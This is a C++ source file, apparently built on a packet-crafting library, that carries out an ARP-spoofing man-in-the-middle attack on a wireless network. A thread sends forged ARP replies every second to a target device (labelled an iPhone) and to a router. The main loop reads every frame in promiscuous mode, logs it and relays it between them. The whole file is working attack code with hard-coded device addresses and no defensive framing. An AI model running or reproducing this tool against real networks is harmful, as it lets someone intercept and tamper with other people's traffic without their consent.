#include <stdio.h>
#include <pgen.h>
#include <thread>

#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/ethernet.h>
#include <netpacket/packet.h>
#define MAX_BUF 10000


const char* dev = "wlan1";
const char* myip = "192.168.179.8";

/* buffalo router */
//const char* router_ip = "192.168.222.1";
//const char* router_mac = "74:03:bd:13:2c:a6";

/* nad11 mobile router */
const char* router_ip = "192.168.179.1";
const char* router_mac = "a2:12:42:17:d8:8f";

/* iphone */
const char* target_ip = "192.168.179.4";
const char* target_mac = "f0:24:75:bf:8d:bf";

/* buffalo usb ethernetl */
//const char* target_ip = "192.168.222.106";
//const char* target_mac = "80:e6:50:17:18:46";

/* mac wlan en0 */
//const char* target_ip = "192.168.222.103";
//const char* target_mac = "cc:e1:d5:02:ea:71";



int sock;
int initSocket(const char* dev);
void mitm_attack(const char* ip1, const char* mac1, 
					const char* ip2, const char* mac2);


void toTarget(u_char* buf, int len){
	macaddr mymac;
	macaddr tmac(target_mac);
	mymac.setmacbydev(dev);
	struct MYETH* eth;
	eth = (struct MYETH*)buf;
	for(int i=0; i<6; i++){
		eth->ether_shost[i] = mymac.getOctet(i);
		eth->ether_dhost[i] = tmac.getOctet(i);
	}
	
	int sendlen = write(sock, buf, len);
	if(sendlen < 0){
		printf("toTarget len: %d \n", len);
	}
}



void toRouter(u_char* buf, int len){
	macaddr mymac;
	macaddr rmac(router_mac);
	mymac.setmacbydev(dev);
	struct MYETH* eth;
	eth = (struct MYETH*)buf;
	for(int i=0; i<6; i++){
		eth->ether_shost[i] = mymac.getOctet(i);
		eth->ether_dhost[i] = rmac.getOctet(i);
	}
	
	int sendlen = write(sock, buf, len);
	if(sendlen < 0){
		printf("toRouter len: %d \n", len);
	}
}



void analizeAndSend(u_char* buf, int len){
	pgen_unknown pack(buf, len);
	pack.summary();
	
	if(pack.IP.dst == target_ip){
		toTarget(buf, len);	
	}else{
		toRouter(buf, len);
	}
}



void myswitch(const char* dev, const char* myip, const char* target_ip, 
		const char* target_mac,const char* router_ip, const char* router_mac){
	u_char buf[MAX_BUF];
	int len;
	sock = initSocket(dev);

	while(1){
		len = read(sock, buf, MAX_BUF);
		if(len < 0){
			perror("read");
			continue;
		}
		analizeAndSend(buf, len);
	}
}


int main(int argc, char** argv){
	std::thread mitm(mitm_attack, target_ip, target_mac, router_ip, router_mac);
	myswitch(dev, myip, target_ip, target_mac, router_ip, router_mac);		
}


int initSocket(const char* dev){
	int sock;
	struct ifreq ifreq;
	struct sockaddr_ll sa;

	sock = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
	if(sock < 0){
		perror("initSocket::socket");
		exit(-1);
	}

	memset(&ifreq, 0, sizeof(struct ifreq));
	strncpy(ifreq.ifr_name, dev, sizeof(ifreq.ifr_name)-1);
	if(ioctl(sock,SIOCGIFINDEX,&ifreq)<0){
		perror("initSocket::ioctl");
		close(sock);
		exit(-1);
	}
	sa.sll_family=PF_PACKET;
	sa.sll_protocol=htons(ETH_P_ALL);
	sa.sll_ifindex=ifreq.ifr_ifindex;
	if(bind(sock,(struct sockaddr *)&sa,sizeof(sa))<0){
		perror("initSocket::bind");
		close(sock);
		exit(-1);
	}

	if(ioctl(sock,SIOCGIFFLAGS,&ifreq)<0){
		perror("ioctl");
		close(sock);
		exit(-1);
	}
	ifreq.ifr_flags=ifreq.ifr_flags|IFF_PROMISC;
	if(ioctl(sock,SIOCSIFFLAGS,&ifreq)<0){
		perror("ioctl");
		close(sock);
		exit(-1);
	}

	return sock;
}




void mitm_attack(const char* ip1, const char* mac1, 
					const char* ip2, const char* mac2){
	pgen_arp pack_to_target1;
	pgen_arp pack_to_target2;

	pack_to_target1.ETH.src.setmacbydev(dev);
	pack_to_target1.ETH.dst = mac1;
	pack_to_target1.ARP.srcEth.setmacbydev(dev);
	pack_to_target1.ARP.srcIp  = ip2;
	pack_to_target1.ARP.dstEth = mac1;
	pack_to_target1.ARP.dstIp  = ip1;
	pack_to_target1.ARP.operation = 2;
	pack_to_target2.ETH.src.setmacbydev(dev);
	pack_to_target2.ETH.dst = mac2;
	pack_to_target2.ARP.srcEth.setmacbydev(dev);
	pack_to_target2.ARP.srcIp  = ip1;
	pack_to_target2.ARP.dstEth = mac2;
	pack_to_target2.ARP.dstIp  = ip2;
	pack_to_target2.ARP.operation = 2;

	for(int i=0; ; i++){
		pack_to_target1.send(dev);
		pack_to_target2.send(dev);
		sleep(1);
	}		
}
